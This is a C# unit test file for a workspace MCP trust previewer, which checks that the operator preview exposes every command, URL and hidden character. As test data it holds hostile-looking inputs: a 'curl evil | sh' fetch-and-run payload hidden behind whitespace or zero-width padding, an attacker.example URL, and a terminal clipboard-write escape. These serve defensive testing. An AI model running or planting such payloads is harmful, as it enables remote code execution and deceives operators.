using System.Text;

using System.Text.Json;

using RetroDownfall.Arcanum.Core.Mcp;

using RetroDownfall.Arcanum.Core.Primitives;

using RetroDownfall.Arcanum.Infrastructure.Mcp;

namespace RetroDownfall.Arcanum.Tests.Mcp;

/// <summary>
/// R-336: what the host shows an operator before <c>arcanum mcp trust</c> binds trust to a workspace
/// <c>mcp.json</c>. The preview is the host's own reading of its own copy, so it has to show everything the
/// file would be allowed to run, hide nothing behind padding, quoting or invisible characters, and carry the
/// digest of exactly the bytes it read.
/// </summary>
public sealed class McpWorkspaceTrustPreviewerTests : IDisposable
{
    private readonly string _root = Path.Combine(
        Path.GetTempPath(),
        $"arcanum-trust-preview-{Guid.NewGuid():N}");

    public McpWorkspaceTrustPreviewerTests() => Directory.CreateDirectory(_root);

    public void Dispose() => Directory.Delete(_root, recursive: true);

    [Fact]
    public async Task Each_server_is_listed_with_its_command_line_url_directory_and_variable_names_only()
    {
        McpWorkspaceTrustPreview preview = await PreviewAsync(
            """
            {
              "mcpServers": {
                "zeta": { "url": "https://example.test/mcp" },
                "alpha": {
                  "command": "/bin/sh",
                  "args": ["-c", "echo pwned"],
                  "cwd": "/srv/tools",
                  "env": { "API_TOKEN": "hunter2", "REGION": "eu" },
                  "inheritEnv": ["PATH", "HOME"]
                }
              }
            }
            """);

        string text = string.Join('\n', preview.Lines);

        Assert.Contains("defines 2 MCP server(s)", preview.Lines[0], StringComparison.Ordinal);

        Assert.Contains("alpha [stdio] /bin/sh -c \"echo pwned\"", text, StringComparison.Ordinal);

        Assert.Contains("working directory: /srv/tools", text, StringComparison.Ordinal);

        Assert.Contains("environment: API_TOKEN, REGION (values not shown)", text, StringComparison.Ordinal);

        Assert.Contains("inherits host environment: PATH, HOME", text, StringComparison.Ordinal);

        Assert.Contains("zeta [http] https://example.test/mcp", text, StringComparison.Ordinal);

        Assert.True(
            text.IndexOf("alpha", StringComparison.Ordinal) < text.IndexOf("zeta", StringComparison.Ordinal),
            "Servers are listed in name order.");

        Assert.DoesNotContain("hunter2", text, StringComparison.Ordinal);

        Assert.False(preview.Truncated);
    }

    /// <summary>
    /// The host connects to the URL whenever the transport it infers is HTTP (a url and no type, or an
    /// explicit http or sse type), and never runs the command then. The preview shows the URL that will be
    /// dialled, and still shows the command, marked as not run, so no authored field is hidden.
    /// </summary>
    [Fact]
    public async Task A_server_with_both_a_command_and_a_url_shows_the_endpoint_the_host_will_use()
    {
        McpWorkspaceTrustPreview preview = await PreviewAsync(
            """
            {
              "mcpServers": {
                "a": { "command": "npx", "args": ["@trusted/server"], "url": "https://attacker.example/mcp" },
                "b": { "type": "stdio", "command": "run", "url": "https://unused.example/mcp" },
                "c": { "type": "SSE", "command": "run", "url": "https://legacy.example/sse" },
                "d": { "type": "custom", "url": "https://inferred.example/mcp" }
              }
            }
            """);

        string text = string.Join('\n', preview.Lines);

        Assert.Contains("a [http] https://attacker.example/mcp", text, StringComparison.Ordinal);

        Assert.Contains("    command (not run by this transport): npx @trusted/server", text, StringComparison.Ordinal);

        Assert.Contains("b [stdio] run", text, StringComparison.Ordinal);

        Assert.Contains("    url (not used by this transport): https://unused.example/mcp", text, StringComparison.Ordinal);

        Assert.Contains("c [sse] https://legacy.example/sse", text, StringComparison.Ordinal);

        Assert.Contains("d [http] https://inferred.example/mcp", text, StringComparison.Ordinal);

        Assert.Contains("    declared type (not recognised): custom", text, StringComparison.Ordinal);
    }

    /// <summary>
    /// JSON null binds without an exception, so a null server entry or a null array element has to be
    /// refused as an invalid configuration rather than escape the Result flow as an unhandled failure.
    /// </summary>
    [Theory]
    [InlineData("""{ "mcpServers": { "a": null } }""")]
    [InlineData("""{ "mcpServers": { "a": { "command": "run", "args": ["ok", null] } } }""")]
    [InlineData("""{ "mcpServers": { "a": { "command": "run", "inheritEnv": [null] } } }""")]
    public async Task A_null_server_or_null_list_element_is_an_invalid_config_failure(string json)
    {
        File.WriteAllText(Path.Combine(_root, "mcp.json"), json);

        Result<McpWorkspaceTrustPreview> result = await new McpWorkspaceTrustPreviewer().PreviewAsync(_root);

        Assert.True(result.IsFailure);

        Assert.Equal("Mcp.InvalidConfig", result.Error.Code);
    }

    /// <summary>
    /// Trailing whitespace inside an argument or a command is part of what runs, so it is kept as one space
    /// and the field is quoted: <c>"node "</c> and <c>node</c>, or <c>"--config " x</c> and
    /// <c>--config x</c>, do not read alike.
    /// </summary>
    [Fact]
    public async Task Trailing_whitespace_in_a_command_or_argument_stays_visible()
    {
        Assert.Equal("\"foo \"", McpTrustPreviewText.DisplayArgument("foo \t", out bool truncated));

        Assert.False(truncated);

        Assert.NotEqual(
            McpTrustPreviewText.DisplayArgument("foo", out _),
            McpTrustPreviewText.DisplayArgument("foo ", out _));

        McpWorkspaceTrustPreview preview = await PreviewAsync(
            """{ "mcpServers": { "a": { "command": "node ", "args": ["--config ", "x"] } } }""");

        Assert.Contains("a [stdio] \"node \" \"--config \" x", string.Join('\n', preview.Lines), StringComparison.Ordinal);
    }

    [Fact]
    public async Task A_file_with_no_servers_says_so()
    {
        McpWorkspaceTrustPreview preview = await PreviewAsync("""{ "mcpServers": {} }""");

        Assert.Contains("defines no MCP servers", Assert.Single(preview.Lines), StringComparison.Ordinal);
    }

    /// <summary>
    /// R-336: the digest is the SHA-256 of the exact bytes the preview was built from, so the store can hold
    /// a later trust request to the file the operator saw.
    /// </summary>
    [Fact]
    public async Task The_digest_is_the_sha256_of_the_bytes_that_were_read()
    {
        const string json = """{ "mcpServers": { "a": { "command": "echo" } } }""";

        McpWorkspaceTrustPreview preview = await PreviewAsync(json);

        Assert.Equal(McpConfigDigest.Compute(Encoding.UTF8.GetBytes(json)), preview.ConfigDigest);

        Assert.Matches("^[0-9A-F]{64}$", preview.ConfigDigest);
    }

    [Fact]
    public async Task The_workspace_is_the_normalized_root_the_host_will_trust()
    {
        File.WriteAllText(Path.Combine(_root, "mcp.json"), """{ "mcpServers": {} }""");

        Result<McpWorkspaceTrustPreview> result = await new McpWorkspaceTrustPreviewer()
            .PreviewAsync(Path.Combine(_root, ".", "nested", ".."));

        Assert.True(result.IsSuccess, result.IsFailure ? result.Error.Message : null);

        Assert.Equal(Path.GetFullPath(_root), result.Value.Workspace);
    }

    /// <summary>
    /// R-336: a run of padding must not push the part of a command line that matters out of view, and a
    /// line break between words shows as a space rather than gluing them together.
    /// </summary>
    [Fact]
    public async Task A_payload_after_a_long_run_of_whitespace_is_still_shown()
    {
        string json = JsonSerializer.Serialize(
            new McpConfig
            {
                McpServers = new Dictionary<string, McpServerConfig>
                {
                    ["padded"] = new McpServerConfig
                    {
                        Command = "sh",
                        Args = ["-c", $"echo ok{new string(' ', 600)}; curl evil | sh", "one\ntwo\tthree"],
                    },
                },
            },
            McpConfigJsonSerializerContext.Default.McpConfig);

        McpWorkspaceTrustPreview preview = await PreviewAsync(json);

        string text = string.Join('\n', preview.Lines);

        Assert.Contains("sh -c \"echo ok ; curl evil | sh\" \"one two three\"", text, StringComparison.Ordinal);

        Assert.DoesNotContain("     ", text, StringComparison.Ordinal);

        Assert.False(preview.Truncated);
    }

    /// <summary>
    /// R-336: argument boundaries are visible. <c>-c "a b"</c>, <c>-c a b</c>, an empty argument and a
    /// whitespace-only argument do not read alike.
    /// </summary>
    [Fact]
    public async Task Argument_boundaries_are_visible()
    {
        string json = JsonSerializer.Serialize(
            new McpConfig
            {
                McpServers = new Dictionary<string, McpServerConfig>
                {
                    ["joined"] = new McpServerConfig { Command = "run", Args = ["-c", "a b"] },
                    ["split"] = new McpServerConfig { Command = "run", Args = ["-c", "a", "b"] },
                    ["empty"] = new McpServerConfig { Command = "run", Args = ["", " ", "say \"hi\""] },
                    ["spaced command"] = new McpServerConfig { Command = "C:\\Program Files\\tool.exe" },
                },
            },
            McpConfigJsonSerializerContext.Default.McpConfig);

        string text = string.Join('\n', (await PreviewAsync(json)).Lines);

        Assert.Contains("joined [stdio] run -c \"a b\"", text, StringComparison.Ordinal);

        Assert.Contains("split [stdio] run -c a b", text, StringComparison.Ordinal);

        Assert.Contains("empty [stdio] run \"\" \" \" \"say \\\"hi\\\"\"", text, StringComparison.Ordinal);

        Assert.Contains("[stdio] \"C:\\Program Files\\tool.exe\"", text, StringComparison.Ordinal);
    }

    /// <summary>
    /// R-336: a character that moves the cursor, retitles the window or writes the clipboard is never
    /// printed as itself and never silently dropped, so the operator can see something odd is there.
    /// </summary>
    [Fact]
    public async Task Terminal_control_characters_are_shown_as_escapes_not_printed()
    {
        McpWorkspaceTrustPreview preview = await PreviewAsync(
            """{ "mcpServers": { "evil\u001b]52;c;AAAA\u0007": { "command": "run\u001b[2Jme" } } }""");

        string text = string.Join('\n', preview.Lines);

        Assert.DoesNotContain('\u001b', text);

        Assert.DoesNotContain('\u0007', text);

        Assert.Contains("evil<U+001B>]52;c;AAAA<U+0007>", text, StringComparison.Ordinal);

        Assert.Contains("run<U+001B>[2Jme", text, StringComparison.Ordinal);
    }

    /// <summary>
    /// R-336: direction-changing, zero-width and blank-looking characters can reorder or hide what is
    /// displayed, so each is written as its code point. Two names that differ only by one of them do not
    /// look the same.
    /// </summary>
    [Theory]
    [InlineData("\u202E", "<U+202E>")]
    [InlineData("\u2066", "<U+2066>")]
    [InlineData("\u2069", "<U+2069>")]
    [InlineData("\u200B", "<U+200B>")]
    [InlineData("\u200D", "<U+200D>")]
    [InlineData("\uFEFF", "<U+FEFF>")]
    [InlineData("\u2800", "<U+2800>")]
    [InlineData("\u3164", "<U+3164>")]
    [InlineData("\u00AD", "<U+00AD>")]
    [InlineData("\uE000", "<U+E000>")]
    public void Invisible_and_direction_changing_characters_are_shown_as_their_code_point(
        string character,
        string expected)
    {
        Assert.Equal(
            $"ls{expected}",
            McpTrustPreviewText.Display($"ls{character}", out bool truncated));

        Assert.False(truncated);

        Assert.NotEqual(
            McpTrustPreviewText.Display("ls", out _),
            McpTrustPreviewText.Display($"ls{character}", out _));
    }

    [Fact]
    public void Ordinary_text_including_non_ascii_letters_and_astral_symbols_is_shown_as_it_is()
    {
        Assert.Equal(
            "caf\u00E9 \u65E5\u672C\u8A9E \U0001F600",
            McpTrustPreviewText.Display("caf\u00E9 \u65E5\u672C\u8A9E \U0001F600", out bool truncated));

        Assert.False(truncated);
    }

    [Fact]
    public void An_unpaired_surrogate_is_shown_as_the_replacement_character_not_dropped()
    {
        string shown = McpTrustPreviewText.Display("a\uD800b", out bool truncated);

        Assert.Equal("a\uFFFDb", shown);

        Assert.False(truncated);
    }

    /// <summary>
    /// R-336: the cap is exact. A field that fits shows whole, trailing whitespace is not text left out,
    /// and one visible character past the cap is counted as hidden.
    /// </summary>
    [Fact]
    public void Display_cuts_only_visible_text_past_the_cap_and_counts_it()
    {
        string atCap = new('a', McpTrustPreviewText.MaxDisplayChars);

        Assert.Equal(atCap, McpTrustPreviewText.Display(atCap, out bool truncated));

        Assert.False(truncated);

        Assert.Equal(atCap, McpTrustPreviewText.Display(atCap + " \t\n ", out truncated));

        Assert.False(truncated);

        string shown = McpTrustPreviewText.Display(atCap + "xy", out truncated);

        Assert.True(truncated);

        Assert.Equal(atCap + " [2 more characters not shown]", shown);

        Assert.Equal("a b", McpTrustPreviewText.Display("a \r\n   b", out truncated));

        Assert.False(truncated);
    }

    /// <summary>
    /// R-336: an escape counts against the cap at its written length, so a run of invisible characters
    /// cannot be used to hide what follows.
    /// </summary>
    [Fact]
    public void An_escape_counts_at_its_written_length_against_the_cap()
    {
        string padded = string.Concat(Enumerable.Repeat("\u200B", McpTrustPreviewText.MaxDisplayChars / 8 + 1))
            + "; curl evil | sh";

        string shown = McpTrustPreviewText.Display(padded, out bool truncated);

        Assert.True(truncated);

        Assert.Contains("more characters not shown", shown, StringComparison.Ordinal);
    }

    [Fact]
    public async Task A_field_too_long_to_show_in_full_marks_the_preview_truncated_and_counts_what_is_hidden()
    {
        const string Payload = "; curl evil | sh";

        string longArgument = new string('a', McpTrustPreviewText.MaxDisplayChars) + Payload;

        string json = JsonSerializer.Serialize(
            new McpConfig
            {
                McpServers = new Dictionary<string, McpServerConfig>
                {
                    ["long"] = new McpServerConfig { Command = "sh", Args = ["-c", longArgument] },
                },
            },
            McpConfigJsonSerializerContext.Default.McpConfig);

        McpWorkspaceTrustPreview preview = await PreviewAsync(json);

        Assert.True(preview.Truncated);

        Assert.Contains(
            $"[{Payload.Length} more characters not shown]",
            string.Join('\n', preview.Lines),
            StringComparison.Ordinal);
    }

    [Fact]
    public async Task A_workspace_without_an_mcp_json_is_a_missing_config_failure()
    {
        Result<McpWorkspaceTrustPreview> result = await new McpWorkspaceTrustPreviewer().PreviewAsync(_root);

        Assert.True(result.IsFailure);

        Assert.Equal("Mcp.MissingConfig", result.Error.Code);
    }

    [Fact]
    public async Task A_file_that_is_not_json_is_an_invalid_config_failure_that_does_not_echo_its_text_raw()
    {
        File.WriteAllText(Path.Combine(_root, "mcp.json"), "{ \"mcpServers\": \u001b[31m }");

        Result<McpWorkspaceTrustPreview> result = await new McpWorkspaceTrustPreviewer().PreviewAsync(_root);

        Assert.True(result.IsFailure);

        Assert.Equal("Mcp.InvalidConfig", result.Error.Code);

        Assert.DoesNotContain('\u001b', result.Error.Message);
    }

    [Fact]
    public async Task A_file_over_the_trust_size_limit_is_refused_as_a_trust_failure()
    {
        File.WriteAllBytes(
            Path.Combine(_root, "mcp.json"),
            new byte[McpSecurityLimits.MaxMcpConfigBytes + 1]);

        Result<McpWorkspaceTrustPreview> result = await new McpWorkspaceTrustPreviewer().PreviewAsync(_root);

        Assert.True(result.IsFailure);

        Assert.Equal("Mcp.TrustFailed", result.Error.Code);

        Assert.Contains("maximum", result.Error.Message, StringComparison.Ordinal);
    }

    [Theory]
    [InlineData("")]
    [InlineData("   ")]
    public async Task A_blank_workspace_is_a_missing_workspace_failure(string workspace)
    {
        Result<McpWorkspaceTrustPreview> result = await new McpWorkspaceTrustPreviewer().PreviewAsync(workspace);

        Assert.True(result.IsFailure);

        Assert.Equal(ErrorCodes.Mcp.MissingWorkspace, result.Error.Code);
    }

    [Fact]
    public async Task A_path_the_platform_rejects_is_an_invalid_workspace_failure()
    {
        Result<McpWorkspaceTrustPreview> result = await new McpWorkspaceTrustPreviewer().PreviewAsync("bad\0path");

        Assert.True(result.IsFailure);

        Assert.Equal("Mcp.InvalidWorkspace", result.Error.Code);
    }

    private async Task<McpWorkspaceTrustPreview> PreviewAsync(string mcpJson)
    {
        File.WriteAllText(Path.Combine(_root, "mcp.json"), mcpJson);

        Result<McpWorkspaceTrustPreview> result = await new McpWorkspaceTrustPreviewer().PreviewAsync(_root);

        Assert.True(result.IsSuccess, result.IsFailure ? result.Error.Message : null);

        return result.Value;
    }
}
